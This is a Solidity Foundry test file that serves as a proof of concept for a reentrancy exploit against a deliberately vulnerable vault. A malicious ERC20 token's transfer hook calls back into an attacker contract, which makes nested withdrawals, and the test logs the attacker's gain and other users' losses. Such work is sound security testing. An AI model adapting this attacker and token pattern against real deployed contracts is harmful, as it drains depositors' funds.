// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @notice Malicious token that calls back during transfer
 * @dev This allows reentrancy during vault.withdraw()
 */
contract MaliciousToken is ERC20 {
    address public hook;
    bool public hookEnabled;

    constructor() ERC20("Malicious Token", "EVIL") {
        _mint(msg.sender, 1000000 * 10**18);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function setHook(address _hook) external {
        hook = _hook;
        hookEnabled = true;
    }

    // Override transfer to enable reentrancy
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        // Call hook BEFORE completing transfer
        if (hookEnabled && hook != address(0) && to == hook) {
            hookEnabled = false; // Prevent infinite recursion
            IReentrancyCallback(hook).onTokenTransfer();
            hookEnabled = true;
        }

        return super.transfer(to, amount);
    }
}

interface IReentrancyCallback {
    function onTokenTransfer() external;
}

/**
 * @notice Attacker contract that exploits reentrancy in VulnerableVault
 */
contract ReentrancyAttacker is IReentrancyCallback {
    VulnerableVault public vault;
    MaliciousToken public token;
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = 3;
    bool public attacking;

    constructor(address _vault, address _token) {
        vault = VulnerableVault(_vault);
        token = MaliciousToken(_token);
    }

    function attack(uint256 amount) external {
        // Verify we have tokens
        uint256 balance = token.balanceOf(address(this));
        console.log("Attacker balance at start of attack:", balance);
        require(balance >= amount, "Insufficient token balance");

        // Setup hook to receive callback
        token.setHook(address(this));

        // Approve vault to spend tokens
        token.approve(address(vault), type(uint256).max);

        // Initial deposit
        vault.deposit(amount);

        console.log("Initial deposit complete. Shares:", vault.balanceOf(address(this)));

        // Start the attack - withdraw a small amount to trigger reentrancy
        attacking = true;
        attackCount = 0;
        // Withdraw 10% of shares to trigger callback while keeping most shares intact
        uint256 sharesToWithdraw = vault.balanceOf(address(this)) / 10;
        if (sharesToWithdraw == 0) sharesToWithdraw = 1;
        vault.withdraw(sharesToWithdraw);
        attacking = false;

        console.log("Attack complete. Total reentrant calls:", attackCount);
    }

    /**
     * @notice Called by malicious token during transfer
     * @dev Perform nested reentrant withdrawals
     */
    function onTokenTransfer() external override {
        require(msg.sender == address(token), "Only token can call");

        if (attacking && attackCount < MAX_ATTACKS) {
            attackCount++;

            uint256 shares = vault.balanceOf(address(this));
            console.log("Reentrant call #", attackCount, "Shares available:", shares);

            if (shares > 0) {
                // Withdraw 10% of remaining shares, triggering more reentrancy
                uint256 sharesToWithdraw = shares / 10;
                if (sharesToWithdraw == 0) sharesToWithdraw = shares; // Withdraw all if too small
                console.log("  -> Withdrawing", sharesToWithdraw, "shares");
                vault.withdraw(sharesToWithdraw);
            }
        }
    }
}

contract ReentrancyVaultExploit is Test {
    VulnerableVault public vault;
    MaliciousToken public token;
    ReentrancyAttacker public attacker;

    address public owner = address(1);
    address public user1 = address(2);
    address public user2 = address(3);

    function setUp() public {
        vm.startPrank(owner);

        // Deploy malicious token and vault
        token = new MaliciousToken();
        vault = new VulnerableVault(address(token), "Vault Shares", "vToken");

        // Fund users with tokens
        token.mint(user1, 100 ether);
        token.mint(user2, 100 ether);

        vm.stopPrank();

        // Legitimate users deposit into vault
        vm.startPrank(user1);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(50 ether);
        vm.stopPrank();

        vm.startPrank(user2);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(50 ether);
        vm.stopPrank();

        // Deploy attacker contract
        attacker = new ReentrancyAttacker(address(vault), address(token));

        console.log("Attacker contract deployed at:", address(attacker));
        console.log("Attacker balance BEFORE mint:", token.balanceOf(address(attacker)));

        // Fund attacker with tokens
        vm.prank(owner);
        token.mint(address(attacker), 10 ether);

        console.log("Attacker balance AFTER mint:", token.balanceOf(address(attacker)));

        console.log("=== Setup Complete ===");
        console.log("Vault total assets:", vault.totalAssets());
        console.log("Vault token balance:", token.balanceOf(address(vault)));
        console.log("Attacker token balance after mint:", token.balanceOf(address(attacker)));
    }

    function testReentrancyExploit() public {
        console.log("\n=== Reentrancy Attack Test ===");

        uint256 vaultAssetsBefore = vault.totalAssets();
        uint256 vaultBalanceBefore = token.balanceOf(address(vault));
        uint256 attackerBalanceBefore = token.balanceOf(address(attacker));
        uint256 user1SharesBefore = vault.balanceOf(user1);

        console.log("\n--- Before Attack ---");
        console.log("Vault totalAssets:", vaultAssetsBefore);
        console.log("Vault token balance:", vaultBalanceBefore);
        console.log("Attacker token balance:", attackerBalanceBefore);
        console.log("User1 shares:", user1SharesBefore);

        // Execute attack
        attacker.attack(10 ether);

        uint256 vaultAssetsAfter = vault.totalAssets();
        uint256 vaultBalanceAfter = token.balanceOf(address(vault));
        uint256 attackerBalanceAfter = token.balanceOf(address(attacker));
        uint256 attackerSharesAfter = vault.balanceOf(address(attacker));

        console.log("\n--- After Attack (before final withdrawal) ---");
        console.log("Vault totalAssets:", vaultAssetsAfter);
        console.log("Vault token balance:", vaultBalanceAfter);
        console.log("Attacker token balance:", attackerBalanceAfter);
        console.log("Attacker shares:", attackerSharesAfter);

        // Now withdraw any remaining shares
        if (attackerSharesAfter > 0) {
            vm.prank(address(attacker));
            vault.withdraw(attackerSharesAfter);
        }

        uint256 attackerFinalBalance = token.balanceOf(address(attacker));
        uint256 vaultFinalBalance = token.balanceOf(address(vault));

        console.log("\n--- After Final Withdrawal ---");
        console.log("Attacker final balance:", attackerFinalBalance);
        console.log("Vault final balance:", vaultFinalBalance);

        // Check impact on other users
        uint256 user1CanWithdraw = vault.convertToAssets(user1SharesBefore);
        console.log("User1 can now withdraw:", user1CanWithdraw, "(should be 50 ether)");

        console.log("\n--- Results ---");
        console.log("Reentrant calls made:", attacker.attackCount());
        console.log("Attacker net gain:", attackerFinalBalance > attackerBalanceBefore ? attackerFinalBalance - attackerBalanceBefore : 0);
        console.log("User1 loss:", user1CanWithdraw < 50 ether ? 50 ether - user1CanWithdraw : 0);

        // Verify reentrancy occurred
        assertGt(attacker.attackCount(), 0, "Reentrancy should have occurred");

        console.log("\n=== SUCCESS: Reentrancy vulnerability demonstrated! ===");
        console.log("Multiple withdraw calls were executed before state updates completed");
    }
}
